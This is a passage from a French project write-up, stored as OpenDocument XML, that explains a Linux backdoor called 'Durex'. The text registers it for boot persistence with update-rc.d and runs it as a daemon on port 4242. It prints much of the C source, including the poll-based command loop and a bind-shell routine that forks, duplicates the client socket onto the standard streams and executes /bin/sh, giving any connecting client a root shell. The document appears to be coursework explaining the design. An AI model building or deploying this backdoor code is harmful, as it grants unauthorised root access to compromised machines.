      <text:p text:style-name="P3">Avec ces fonctions d'exécution de commandes système à notre disposition, on peut simplement exécuter <text:span text:style-name="T1">update-rc.d durex default</text:span> (afin que durex démarre au boot), puis exécuter le binaire <text:span text:style-name="T1">/bin/./durex daemon</text:span><text:span text:style-name="T6"> </text:span>(en mode <text:span text:style-name="T6">daemon</text:span>).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">De là, le travail de setup et de configuration est terminé.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list4073197480979879659" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P37">Durex daemon</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Examinons désormais le payload de ce binaire, en d'autres termes ce qu'il permet réellement de faire <text:soft-page-break/>lorsqu'il est lancé en daemon (au bout ou suite à l'exécution du programme originel).</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Le programme débute dans <text:span text:style-name="T6">durex_daemon.c</text:span>. On commence par appeler <text:span text:style-name="T6">setup_server</text:span>, une fonction qui va simplement créer une socket (en SO_REUSEADDR pour qu'on puisse la relancer sans devoir attendre), la bind sur <text:span text:style-name="T6">0.0.0.0 </text:span>(INADDR_ANY), puis attendre des connexions entrantes de potentiels clients.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Certaines autres valeurs de la structure <text:span text:style-name="T6">server</text:span> sont initialisées, notamment <text:span text:style-name="T1">server-&gt;pfds</text:span> et <text:span text:style-name="T1">server-&gt;nfds</text:span>. Il s'agit de variables qui vont nous servir dans le cadre de l'utilisation de <text:span text:style-name="T6">poll()</text:span>, qu'on va appeler ici plutôt que <text:span text:style-name="T6">select()</text:span>, car poll est bien plus performant :</text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/970979/what-are-the-differences-between-poll-and-select" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://stackoverflow.com/questions/970979/what-are-the-differences-between-poll-and-select</text:a> </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Voir le man de <text:span text:style-name="T6">poll</text:span> pour les explications :</text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man2/poll.2.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://man7.org/linux/man-pages/man2/poll.2.html</text:a> </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Pour résumer, poll prend en premier argument un tableau de structures <text:span text:style-name="T6">pollfd</text:span> :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P10"><text:s text:c="7"/>struct pollfd {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="15"/>int <text:s text:c="2"/>fd; <text:s text:c="8"/>/* file descriptor */</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="15"/>short events; <text:s text:c="4"/>/* requested events */</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="15"/>short revents; <text:s text:c="3"/>/* returned events */</text:p>
      <text:p text:style-name="P13"><text:s text:c="11"/>};</text:p>
      <text:p text:style-name="P7">Le fd correspond à un <text:span text:style-name="T6">fd</text:span> à surveiller, <text:span text:style-name="T6">events</text:span> aux événements à surveiller (exemple : POLLIN pour vérifier si le fd a des données à lire), et <text:span text:style-name="T6">revents</text:span> pour les événements retournés par le système. Si <text:span text:style-name="T6">fd</text:span> est négatif, il est ignoré.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">On sait dès à présent que le nombre maximum de clients sera <text:span text:style-name="T6">4</text:span>, et qu'on aura un <text:span text:style-name="T6">listen_sd</text:span> du serveur, soit 4 <text:span text:style-name="T6">fd </text:span>maximum à surveiller. Dans le setup du serveur, on :</text:p>
      <text:p text:style-name="P7">&gt; Alloue dans la structure <text:span text:style-name="T6">server</text:span> un tableau de <text:span text:style-name="T6">4 struct pollfd</text:span>.</text:p>
      <text:p text:style-name="P7">&gt; On place <text:span text:style-name="T6">listen_sd</text:span> à l'index 0, et on surveille POLLIN (disponible en lecture = connexion entrante).</text:p>
      <text:p text:style-name="P7">&gt; On initialise les autres <text:span text:style-name="T6">fd</text:span> à -1 pour les ignorer pour le moment.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Le setup du serveur est complet, on peut maintenant entrer dans la boucle principale du <text:span text:style-name="T6">daemon</text:span>.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P18"><text:span text:style-name="T19">while</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">ready</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">poll(server.pfds,</text:span> <text:span text:style-name="T17">server.nfds,</text:span> <text:span text:style-name="T17">-</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(ready</text:span> <text:span text:style-name="T17">&lt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T19">continue</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">for</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T15">int</text:span> <text:span text:style-name="T17">i</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">;</text:span> <text:span text:style-name="T17">i</text:span> <text:span text:style-name="T17">&lt;</text:span> <text:span text:style-name="T17">server.nfds;</text:span> <text:span text:style-name="T17">i++)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(server.pfds[i].revents</text:span> <text:span text:style-name="T17">&amp;</text:span> <text:span text:style-name="T17">POLLIN)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(server.pfds[i].fd</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T17">server.listen_sd)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">add_client(&amp;server);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T19">else</text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/><text:s text:c="16"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">tmp</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">get_client_from_fd(&amp;server,</text:span> <text:span text:style-name="T17">server.pfds[i].fd);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">rc</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">recv(server.pfds[i].fd,</text:span> <text:span text:style-name="T17">server.buff,</text:span> <text:span text:style-name="T17">RECV_SIZE</text:span> <text:span text:style-name="T17">-</text:span> <text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(rc</text:span> <text:span text:style-name="T17">&lt;=</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">shutdown_connection(&amp;server,</text:span> <text:span text:style-name="T17">tmp);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">else</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">server.buff[rc]</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T21">'\0'</text:span><text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">server.buff[strcspn(server.buff,</text:span> <text:span text:style-name="T21">"\n"</text:span><text:span text:style-name="T17">)]</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T21">'\0'</text:span><text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(!tmp-&gt;auth)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T17">authenticate(&amp;server,</text:span> <text:span text:style-name="T17">tmp);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T19">else</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(!strcmp(server.buff,</text:span> <text:span text:style-name="T21">"?"</text:span><text:span text:style-name="T17">))</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T17">send_info(&amp;server,</text:span> <text:span text:style-name="T17">server.pfds[i].fd,</text:span> <text:span text:style-name="T21">"[...]"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T19">else</text:span> <text:span text:style-name="T16">if</text:span> <text:span text:style-name="T17">(!strcmp(server.buff,</text:span> <text:span text:style-name="T21">"shell"</text:span><text:span text:style-name="T17">))</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T17">send_info(&amp;server,</text:span> <text:span text:style-name="T17">server.pfds[i].fd,</text:span> <text:span text:style-name="T21">"[...]"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T17">durex_shell(&amp;server);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T19">else</text:span> <text:span text:style-name="T16">if</text:span> <text:span text:style-name="T17">(!strcmp(server.buff,</text:span> <text:span text:style-name="T21">"exit"</text:span><text:span text:style-name="T17">))</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T17">send_info(&amp;server,</text:span> <text:span text:style-name="T17">server.pfds[i].fd,</text:span> <text:span text:style-name="T21">"Bye!"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T17">shutdown_connection(&amp;server,</text:span> <text:span text:style-name="T17">tmp);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="28"/><text:span text:style-name="T19">else</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="32"/><text:span text:style-name="T16">send_info</text:span><text:span text:style-name="T17">(&amp;server,</text:span> <text:span text:style-name="T17">server.pfds[i].fd,</text:span> <text:span text:style-name="T21">"$&gt; "</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P7">La boucle est finalement très similaire à celle de l'<text:span text:style-name="T6">Exam06</text:span>. Le troisième argument de <text:span text:style-name="T6">poll</text:span> (-1) lui indique de <text:span text:style-name="T6">bloquer</text:span> tant qu'au moins un des <text:span text:style-name="T6">fd</text:span> surveillés n'est pas prêt (en fonction des événements de la structure, ici uniquement POLLIN).</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Lorsqu'au moins un des <text:span text:style-name="T6">fd</text:span> est prêt, on parcourt tous les <text:span text:style-name="T6">fd</text:span> surveillés et on voit s'ils sont prêts en lecture. Si oui et qu'il s'agit du <text:span text:style-name="T6">listen_sd</text:span> du serveur, on ajoute un client à la liste chaînée des clients. On ajoute sa <text:span text:style-name="T6">socket</text:span> au tableau de <text:span text:style-name="T6">pollfd</text:span> du serveur pour la surveiller et réagir quand des données nous sont envoyées.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">S'il s'agit d'une autre socket, on réagit à la fermeture de la connexion (recv nous renvoie 0 ou moins). La fermeture de la connexion avec un client implique :</text:p>
      <text:list xml:id="list6268301102735716727" text:style-name="L24">
        <text:list-item>
          <text:p text:style-name="P64">De le supprimer de la liste chaînée des clients.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64"><text:soft-page-break/>De <text:span text:style-name="T6">close</text:span> le file descriptor associé à sa socket.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P64">De remettre à <text:span text:style-name="T6">-1</text:span> le <text:span text:style-name="T6">pollfd</text:span> du serveur qui contenait la socket qu'on vient de fermer et qu'on ne doit plus surveiller.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Si le client nous a envoyé des données, on réagit :</text:p>
      <text:list xml:id="list2432920060299118886" text:style-name="L25">
        <text:list-item>
          <text:p text:style-name="P65">En affichant l'aide s'il nous a envoyé un point d'interrogation.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P65">En fermant la connexion s'il nous a envoyé "exit".</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P65">En passant en mode shell s'il nous a envoyé "shell".</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:list xml:id="list3141023147804731682" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P38">Durex shell</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Lorsqu'un client demande une <text:span text:style-name="T6">shell</text:span>, la fonction <text:span text:style-name="T6">durex_shell</text:span> est appelée. L'idée est qu'on va faire spawn une <text:span text:style-name="T6">Bind Shell</text:span>. Au contraire d'une reverse shell où c'est la machine infectée qui ouvre la connexion sur la machine attaquante, on va ici mettre à disposition de tout client qui se connecte sur le port 4242 de la machine infectée une <text:span text:style-name="T6">shell root</text:span>. Du coup, le daemon classique ne tournera plus sur ce port, on sera en <text:span text:style-name="T7">mode shell</text:span>.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Comme indiqué en introduction, Durex restera en mode shell tant qu'au moins une shell n'a pas été ouverte, puis jusqu'à ce que l'ensemble des shells ouvertes par des clients (maximum 3 simultanés) aient été fermées.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Dans le cadre du mode shell, on commence par appeler la fonction <text:span text:style-name="T6">reset_server</text:span>. Cette fonction va simplement :</text:p>
      <text:list xml:id="list3929164211595502939" text:style-name="L26">
        <text:list-item>
          <text:p text:style-name="P66">Fermer toutes les connexions avec les clients actu<text:span text:style-name="T23">els (du daemon) par des </text:span><text:span text:style-name="T24">close</text:span><text:span text:style-name="T23"> et supprimer tous les éléments de la liste chaînée des clients.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66"><text:span text:style-name="T23">Reset les différentes variables du serveur (nombre de clients, ...).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P66"><text:span text:style-name="T23">Remettre à -1 tous les </text:span><text:span text:style-name="T24">fd</text:span><text:span text:style-name="T23"> de sa structure </text:span><text:span text:style-name="T24">pollfd</text:span><text:span text:style-name="T23">, sauf le premier qui correspond au </text:span><text:span text:style-name="T24">listen_sd</text:span><text:span text:style-name="T23"> du serveur, qu'on garde.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"><text:span text:style-name="T23"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T23">Une fois le serveur réinitialisé, on entame la boucle du mode shell, qui n'est finalement pas si différente du mode daemon et implémente une </text:span><text:span text:style-name="T24">bind shell </text:span><text:span text:style-name="T23">:</text:span></text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://anubissec.github.io/Creating-a-TCP-Bind-Shell/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://anubissec.github.io/Creating-a-TCP-Bind-Shell/</text:a><text:span text:style-name="T23"># </text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P18">[..... SNIP .....]</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="4"/><text:span text:style-name="T19">while</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">tmp</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">server-&gt;clients;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">while</text:span> <text:span text:style-name="T17">(tmp)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(tmp-&gt;pid</text:span> <text:span text:style-name="T17">!=</text:span> <text:span text:style-name="T17">-</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">((waitpid(tmp-&gt;pid,</text:span> <text:span text:style-name="T17">NULL,</text:span> <text:span text:style-name="T17">WNOHANG))</text:span> <text:span text:style-name="T17">&gt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"[SHELL MODE] [Log message...]"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">send_info(server,</text:span> <text:span text:style-name="T17">tmp-&gt;fd,</text:span> <text:span text:style-name="T21">"Bye!"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">shutdown_connection(server,</text:span> <text:span text:style-name="T17">tmp);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">tmp</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">tmp-&gt;next;</text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/><text:s text:c="8"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(server-&gt;shell_started</text:span> <text:span text:style-name="T17">!=</text:span> <text:span text:style-name="T20">0</text:span> <text:span text:style-name="T17">&amp;&amp;</text:span> <text:span text:style-name="T17">server-&gt;client_nb</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"[SHELL MODE] No shell client left.\n"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">ready</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">poll(server-&gt;pfds,</text:span> <text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span> <text:s text:c="5"/><text:span text:style-name="T18">// Only the server listen_sd</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(ready</text:span> <text:span text:style-name="T17">&lt;=</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T19">continue</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T19">for</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T15">int</text:span> <text:span text:style-name="T17">i</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">;</text:span> <text:span text:style-name="T17">i</text:span> <text:span text:style-name="T17">&lt;</text:span> <text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">;</text:span> <text:span text:style-name="T17">i++)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(server-&gt;pfds[i].revents</text:span> <text:span text:style-name="T17">&amp;</text:span> <text:span text:style-name="T17">POLLIN)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(server-&gt;pfds[i].fd</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T17">server-&gt;listen_sd)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T15">int</text:span> <text:span text:style-name="T17">clientid</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">add_shell_client(server);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(clientid</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T17">-</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">t_client</text:span> <text:span text:style-name="T17">*new_client</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">get_client_from_id(server,</text:span> <text:span text:style-name="T17">clientid);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T15">pid_t</text:span> <text:span text:style-name="T17">pid</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">fork();</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">==</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">dup2(new_client-&gt;fd,</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">dup2(new_client-&gt;fd,</text:span> <text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">dup2(new_client-&gt;fd,</text:span> <text:span text:style-name="T20">2</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">execve(</text:span><text:span text:style-name="T21">"/bin/sh"</text:span><text:span text:style-name="T17">,</text:span> <text:span text:style-name="T17">args,</text:span> <text:span text:style-name="T17">NULL);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T19">else</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"[SHELL MODE] [Log message...]"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T17">new_client-&gt;pid</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">pid;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="24"/><text:span text:style-name="T19">break</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="20"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="16"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">printf(</text:span><text:span text:style-name="T21">"[LOG] Exited shell mode, returning to daemon mode.\n"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">reset_server(server);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">return</text:span> <text:span text:style-name="T17">;</text:span></text:p>
      <text:p text:style-name="P22">}</text:p>
